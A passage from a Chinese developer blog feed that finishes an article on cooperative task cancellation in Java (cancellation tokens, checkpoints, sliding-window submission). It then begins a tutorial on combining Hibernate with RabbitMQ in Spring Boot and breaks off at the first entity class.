    <span class="hljs-meta">@SuppressWarnings({"unchecked", "raw"})</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">lateBind</span><span class="hljs-params">(List&lt;ListenableFuture&lt;T&gt;&gt; futures,
                             Duration timeout,
                             ListenableFuture&lt;?&gt; submitCanceller)</span> {
        <span class="hljs-comment">// 快速失败 Future：任何一个任务失败都会触发</span>
        FluentFuture&lt;?&gt; failFastFuture = FluentFuture.from(Futures.allAsList(futures))
                .catchingAsync(Throwable.class,
                    ex -&gt; Futures.immediateCancelledFuture(), directExecutor())
                .withTimeout(timeout, TimerService.getTimer());

        <span class="hljs-comment">// 所有任务的组合 Future</span>
        ListenableFuture&lt;?&gt; allFutures = Futures.successfulAsList(
            Futures.successfulAsList(futures), submitCanceller);

        <span class="hljs-comment">// 监听快速失败 Future 的完成事件</span>
        failFastFuture.addCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FutureCallback</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(Object result)</span> {
                state.compareAndSet(RUNNING, SUCCESS);
            }

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFailure</span><span class="hljs-params">(Throwable t)</span> {
                <span class="hljs-comment">// 取消所有任务</span>
                allFutures.cancel(<span class="hljs-literal">true</span>);
                <span class="hljs-comment">// 根据异常类型设置状态</span>
                <span class="hljs-keyword">if</span> (t <span class="hljs-keyword">instanceof</span> TimeoutException) {
                    state.compareAndSet(RUNNING, TIMEOUT_CANCELLED);
                } <span class="hljs-keyword">else</span> {
                    state.compareAndSet(RUNNING, FAIL_FAST_CANCELLED);
                }
            }
        }, directExecutor());

        <span class="hljs-comment">// 绑定到 futureToken</span>
        futureToken.setFuture(failFastFuture);
    }

    <span class="hljs-comment">/**
     * 主动取消
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancel</span><span class="hljs-params">(<span class="hljs-type">boolean</span> useInterrupt)</span> {
        state.compareAndSet(RUNNING, MUTUAL_CANCELLED);
        futureToken.cancel(useInterrupt);
    }

    <span class="hljs-keyword">public</span> CancellationTokenState <span class="hljs-title function_">checkState</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> state.get();
    }
}
</code></pre>
<p><strong>关键设计</strong>：</p>
<ol>
<li>
<p><strong>延迟绑定（Late Binding）</strong>：<code>SettableFuture</code> 允许先创建 Token，后绑定实际 Future，解决"先有鸡还是先有蛋"问题</p>
</li>
<li>
<p><strong>快速失败语义</strong>：使用 <code>Futures.allAsList()</code> + <code>catchingAsync</code> 实现——只要有一个任务失败，立即触发取消</p>
</li>
<li>
<p><strong>超时控制</strong>：<code>withTimeout()</code> 设置超时，超时后触发 <code>TimeoutException</code></p>
</li>
</ol>
<h3 data-id="heading-5">3. Checkpoints - 检查点机制</h3>
<p>由于无法强制中断 CPU 密集型代码，我们在任务代码中插入"检查点"：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Checkpoints</span> {

    <span class="hljs-comment">/**
     * 标准检查点：检查 cancelToken 状态
     * 如果任务已取消，抛出取消异常
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkpoint</span><span class="hljs-params">(String taskName, <span class="hljs-type">boolean</span> lean)</span> {
        <span class="hljs-type">ParallelOptions</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> TaskScopeTl.getParallelOptions();
        <span class="hljs-keyword">if</span> (taskName == <span class="hljs-literal">null</span> || options == <span class="hljs-literal">null</span>
                || <span class="hljs-string">"task"</span>.equals(options.getTaskName())
                || !taskName.equals(options.getTaskName())) {
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-type">CancellationToken</span> <span class="hljs-variable">cancelToken</span> <span class="hljs-operator">=</span> TaskScopeTl.getCancellationToken();
        <span class="hljs-keyword">if</span> (cancelToken != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">if</span> (cancelToken.checkState().shouldCancelSubtasks()) {
                <span class="hljs-keyword">throw</span> lean
                    ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">LeanCancellationException</span>(<span class="hljs-string">"Cancel during running"</span>)
                    : <span class="hljs-keyword">new</span> <span class="hljs-title class_">FatCancellationException</span>(<span class="hljs-string">"Cancel during running"</span>);
            }
        }
    }

    <span class="hljs-comment">/**
     * 原始检查点：只检查线程中断标志
     * 适用于不使用 cancelToken 的场景
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rawCheckpoint</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (Thread.interrupted()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FatCancellationException</span>(<span class="hljs-string">"Cancel by interruption"</span>);
        }
    }
}
</code></pre>
<p><strong>两种取消异常</strong>：</p>
<ul>
<li><code>FatCancellationException</code>：带完整堆栈，便于调试</li>
<li><code>LeanCancellationException</code>：无堆栈，生产环境减少开销</li>
</ul>
<h3 data-id="heading-6">4. ScopedCallable - 带作用域的 Callable 包装器</h3>
<p>包装原始任务，添加上下文绑定和监控能力：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScopedCallable</span>&lt;V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Callable</span>&lt;V&gt;, Attachable {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PARALLEL_OPTIONS</span> <span class="hljs-operator">=</span> <span class="hljs-string">"parallelOptions"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_CANCELLATION_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">"cancellationToken"</span>;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String taskName;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Callable&lt;V&gt; delegate;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentMap&lt;String, Object&gt; attachments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. 准备上下文：绑定 CancellationToken 到 ThreadLocal</span>
        TaskScopeTl.init(getCancellationToken(), getParallelOptions());
        TaskPair.init(taskName);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 2. 执行检查点（任务开始前检查）</span>
            Checkpoints.checkpoint(taskName, <span class="hljs-literal">true</span>);
            startTime = ticker.read();
            <span class="hljs-comment">// 3. 执行实际任务</span>
            <span class="hljs-keyword">return</span> delegate.call();
        } <span class="hljs-keyword">finally</span> {
            endTime = ticker.read();
            <span class="hljs-comment">// 4. 清理上下文</span>
            TaskScopeTl.remove();
            <span class="hljs-comment">// 5. 记录监控指标</span>
            recordMetrics();
        }
    }
}
</code></pre>
<p><strong>设计要点</strong>：</p>
<ul>
<li>通过 <code>Attachable</code> 接口支持任意上下文传递</li>
<li>任务执行前自动调用检查点</li>
<li>使用 <code>ThreadLocal</code> 传递取消令牌，子方法可随时检查</li>
</ul>
<h3 data-id="heading-7">5. ConcurrentLimitExecutor - 并发限制执行器</h3>
<p>控制同时执行的任务数量，实现"滑动窗口"提交：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcurrentLimitExecutor</span>&lt;V&gt; {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ExecutorCompletionService&lt;V&gt; cs;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> BlockingQueue&lt;ListenableFuture&lt;V&gt;&gt; blockingQueue =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ParallelOptions options;

    <span class="hljs-comment">/**
     * 提交所有任务，立即返回 Future 列表
     */</span>
    <span class="hljs-keyword">public</span> AsyncBatchResult&lt;V&gt; <span class="hljs-title function_">submitAll</span><span class="hljs-params">(List&lt;? extends Callable&lt;V&gt;&gt; tasks)</span> {
        Builder&lt;ListenableFuture&lt;V&gt;&gt; resultBuilder =
            ImmutableList.builderWithExpectedSize(tasks.size());

        <span class="hljs-comment">// 1. 立即提交初始批次（数量 = 并行度）</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> Math.min(tasks.size(), options.getParallelism());
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; start; i++) {
            resultBuilder.add(fallbackSubmit(tasks, i));
        }

        <span class="hljs-type">int</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> tasks.size() - start;
        <span class="hljs-keyword">if</span> (remaining &lt;= <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> AsyncBatchResult.&lt;V&gt;builder()
                    .results(resultBuilder.build())
                    .build();
        }

        <span class="hljs-comment">// 2. 为剩余任务创建 SettableFuture 占位</span>
        List&lt;SettableFuture&lt;V&gt;&gt; others = IntStream.range(<span class="hljs-number">0</span>, remaining)
                .mapToObj(ignore -&gt; SettableFuture.&lt;V&gt;create())
                .collect(toImmutableList());

        ImmutableList&lt;ListenableFuture&lt;V&gt;&gt; results =
            resultBuilder.addAll(others).build();

        <span class="hljs-comment">// 3. 异步提交剩余任务（在独立线程中）</span>
        ListenableFuture&lt;?&gt; submittingFuture =
            TimerService.getTimer().submit(() -&gt; submitRemaining(tasks, results, start));

        <span class="hljs-keyword">return</span> AsyncBatchResult.&lt;V&gt;builder()
                .submitCanceller(submittingFuture)
                .results(results)
                .build();
    }

    <span class="hljs-comment">/**
     * 提交剩余任务（在独立线程执行）
     * 等待一个完成 -&gt; 提交下一个
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">submitRemaining</span><span class="hljs-params">(List&lt;? extends Callable&lt;V&gt;&gt; tasks,
                                List&lt;ListenableFuture&lt;V&gt;&gt; result,
                                <span class="hljs-type">int</span> start)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> start;
        <span class="hljs-keyword">while</span> (index &lt; tasks.size()) {
            <span class="hljs-comment">// 阻塞等待任何一个任务完成</span>
            ListenableFuture&lt;V&gt; completed = blockingQueue.take();

            <span class="hljs-comment">// 检查是否已取消</span>
            <span class="hljs-keyword">if</span> (completed.isCancelled() || result.get(index).isCancelled()
                    || Thread.interrupted()) {
                <span class="hljs-keyword">return</span> submitted;
            }

            <span class="hljs-comment">// 提交下一个任务，绑定到对应位置的 SettableFuture</span>
            ((SettableFuture&lt;V&gt;) result.get(index))
                .setFuture(fallbackSubmit(tasks, index));
            index++;
        }
        <span class="hljs-keyword">return</span> submitted;
    }
}
</code></pre>
<p><strong>滑动窗口机制</strong>：</p>
<ol>
<li>初始提交 N 个任务（N = 并行度）</li>
<li>等待任何一个完成，释放一个"槽位"</li>
<li>提交下一个任务</li>
<li>重复直到所有任务提交完成</li>
</ol>
<h2 data-id="heading-8">整体流程</h2>
<p>下面是 <code>FlightParallelHelper.parMap</code> 的完整流程：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T, R&gt; AsyncBatchResult&lt;R&gt; <span class="hljs-title function_">parMap</span><span class="hljs-params">(
        List&lt;T&gt; list,
        Function&lt;? <span class="hljs-built_in">super</span> T, ? extends R&gt; function,
        ParallelOptions options,
        ListeningExecutorService executor,
        String executorName)</span> {

    <span class="hljs-keyword">if</span> (CollectionUtils.isEmpty(list)) {
        <span class="hljs-keyword">return</span> emptyBatchResult();
    }

    <span class="hljs-comment">// 1. 规范化参数</span>
    <span class="hljs-type">ParallelOptions</span> <span class="hljs-variable">normalizedOptions</span> <span class="hljs-operator">=</span> ParallelOptions.formalized(options, list.size());
    <span class="hljs-type">String</span> <span class="hljs-variable">taskName</span> <span class="hljs-operator">=</span> normalizedOptions.getTaskName();

    <span class="hljs-comment">// 2. 创建取消令牌（此时未绑定 Future）</span>
    <span class="hljs-type">CancellationToken</span> <span class="hljs-variable">cancellationToken</span> <span class="hljs-operator">=</span> CancellationToken.create();

    <span class="hljs-comment">// 3. 包装任务，附加上下文</span>
    List&lt;Callable&lt;R&gt;&gt; tasks = list.stream()
            .map(item -&gt; {
                ScopedCallable&lt;R&gt; scopedCallable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScopedCallable</span>&lt;&gt;(
                    taskName, () -&gt; function.apply(item));
                scopedCallable.put(KEY_PARALLEL_OPTIONS, normalizedOptions);
                scopedCallable.put(KEY_CANCELLATION_TOKEN, cancellationToken);
                <span class="hljs-keyword">return</span> (Callable&lt;R&gt;) scopedCallable;
            })
            .collect(toImmutableList());

    <span class="hljs-comment">// 4. 通过限流执行器提交任务</span>
    AsyncBatchResult&lt;R&gt; batchResult = ConcurrentLimitExecutor.&lt;R&gt;builder()
            .pool(executor)
            .options(normalizedOptions)
            .build()
            .submitAll(tasks);

    <span class="hljs-comment">// 5. 延迟绑定：将 Future 列表绑定到 CancellationToken</span>
    cancellationToken.lateBind(
        batchResult.getResults(),
        normalizedOptions.forTimeout(),
        batchResult.getSubmitCanceller());

    <span class="hljs-comment">// 6. 超时时触发资源清理</span>
    tryPurgeOnTimeout(executorName, batchResult);

    <span class="hljs-keyword">return</span> batchResult;
}
</code></pre>
<h2 data-id="heading-9">时序图</h2>
<pre><code class="hljs language-scss" lang="scss">┌─────────────┐   ┌──────────────────┐   ┌─────────────────┐   ┌──────────────┐
│  Caller     │   │ FlightParallel   │   │CancellationToken│   │  Executor    │
└──────┬──────┘   └────────┬─────────┘   └────────┬────────┘   └──────┬───────┘
       │                   │                      │                   │
       │   <span class="hljs-built_in">parMap</span>(list)    │                      │                   │
       │──────────────────&gt;│                      │                   │
       │                   │                      │                   │
       │                   │     <span class="hljs-built_in">create</span>()         │                   │
       │                   │─────────────────────&gt;│                   │
       │                   │                      │                   │
       │                   │              <span class="hljs-built_in">submitAll</span>(tasks)            │
       │                   │─────────────────────────────────────────&gt;│
       │                   │                      │                   │
       │                   │              Future<span class="hljs-selector-attr">[]</span> results            │
       │                   │&lt;─────────────────────────────────────────│
       │                   │                      │                   │
       │                   │  <span class="hljs-built_in">lateBind</span>(futures)   │                   │
       │                   │─────────────────────&gt;│                   │
       │                   │                      │                   │
       │  AsyncBatchResult │                      │                   │
       │&lt;──────────────────│                      │                   │
       │                   │                      │                   │
       │                   │                      │   任务执行...      │
       │                   │                      │&lt;──────────────────│
       │                   │                      │                   │
       │                   │                      │   <span class="hljs-built_in">checkpoint</span>()    │
       │                   │                      │&lt;──────────────────│
       │                   │                      │                   │
       │                   │  <span class="hljs-selector-attr">[超时/异常时]</span>        │                   │
       │                   │                      │   <span class="hljs-built_in">cancel</span>(true)    │
       │                   │                      │──────────────────&gt;│
       │                   │                      │                   │
</code></pre>
<h2 data-id="heading-10">在业务代码中使用检查点</h2>
<p>对于 CPU 密集型任务，需要在关键位置插入检查点：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processLargeDataSet</span><span class="hljs-params">(List&lt;Data&gt; dataList)</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; dataList.size(); i++) {
        <span class="hljs-comment">// 每处理 100 条数据检查一次</span>
        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>) {
            Checkpoints.checkpoint(<span class="hljs-string">"processData"</span>, <span class="hljs-literal">true</span>);
        }

        processItem(dataList.get(i));
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">complexCalculation</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 阶段 1</span>
    doPhase1();
    Checkpoints.checkpoint(<span class="hljs-string">"complexCalc"</span>, <span class="hljs-literal">true</span>);

    <span class="hljs-comment">// 阶段 2</span>
    doPhase2();
    Checkpoints.checkpoint(<span class="hljs-string">"complexCalc"</span>, <span class="hljs-literal">true</span>);

    <span class="hljs-comment">// 阶段 3</span>
    doPhase3();
}
</code></pre>
<h2 data-id="heading-11">总结</h2>
<p>本文介绍的取消机制包含以下核心设计思想：</p>

































<table><thead><tr><th>设计点</th><th>解决的问题</th></tr></thead><tbody><tr><td><strong>协作式取消</strong></td><td>Java 无法强制中断 CPU 密集型代码</td></tr><tr><td><strong>延迟绑定</strong></td><td>解决"先创建 Token 还是先提交任务"的循环依赖</td></tr><tr><td><strong>状态枚举</strong></td><td>清晰区分不同取消原因，便于监控和排查</td></tr><tr><td><strong>轻量级异常</strong></td><td>生产环境减少堆栈开销</td></tr><tr><td><strong>滑动窗口提交</strong></td><td>控制并发度，避免线程池过载</td></tr><tr><td><strong>上下文传递</strong></td><td>ThreadLocal + Attachable 实现跨方法的取消信号传递</td></tr></tbody></table>
<p>这套机制已在生产环境稳定运行，有效减少了超时场景下的资源浪费，提升了系统整体吞吐能力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（73）如何在事件驱动架构中使用Hibernate？]]></title>    <link>https://juejin.cn/post/7600967006893719561</link>    <guid>https://juejin.cn/post/7600967006893719561</guid>    <pubDate>2026-01-30T11:49:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600967006893719561" data-draft-id="7600955777315782694" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（73）如何在事件驱动架构中使用Hibernate？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-30T11:49:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（73）如何在事件驱动架构中使用Hibernate？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T11:49:57.000Z" title="Fri Jan 30 2026 11:49:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在事件驱动架构中使用Hibernate，可以有效地处理数据持久性，并在事件发生时触发相应的数据库操作。事件驱动架构通常涉及使用消息队列（如RabbitMQ、Kafka等）来发布和订阅事件。下面我们将展示如何在Spring Boot项目中结合Hibernate和RabbitMQ实现事件驱动架构。</p>
<h3 data-id="heading-0">1. 项目依赖</h3>
<p>在<code>pom.xml</code>中添加必要的依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- RabbitMQ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. 配置数据源和Hibernate属性</h3>
<p>在<code>application.properties</code>中配置数据源和Hibernate属性：</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect

# RabbitMQ Configuration
spring.rabbitmq.host=localhost
spring.rabbitmq.port=5672
spring.rabbitmq.username=guest
spring.rabbitmq.password=guest
</code></pre>
<h3 data-id="heading-2">3. 定义实体类和DAO层</h3>
<h4 data-id="heading-3"><code>Order.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;
